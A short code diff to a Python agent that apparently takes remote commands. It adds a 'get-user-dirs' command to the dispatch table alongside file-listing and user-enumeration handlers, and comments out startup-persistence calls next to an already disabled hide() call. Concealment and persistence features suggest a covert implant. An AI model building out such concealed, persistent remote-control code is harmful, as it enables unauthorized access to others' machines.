@@ -66,6 +66,7 @@ def handle_input(message: str):
         "ls": fh.listdir_handler,
         "pwd": fh.pwd,
         "mkdir": fh.handle_mkdir,
+        "get-user-dirs": fh.get_user_directories,
         "get-users": ad.get_users,
         "set-buffer": set_buffer,
         "set-interval": set_interval,
@@ -109,8 +110,8 @@ def start_server():
     error_count = 0
     mac = get_mac()
     #lu.hide()
-    lu.add_to_startup_1()
-    lu.add_to_startup_2()
+    #lu.add_to_startup_1()
+    #lu.add_to_startup_2()
     while True:
         time.sleep(get_sleep_time())
 
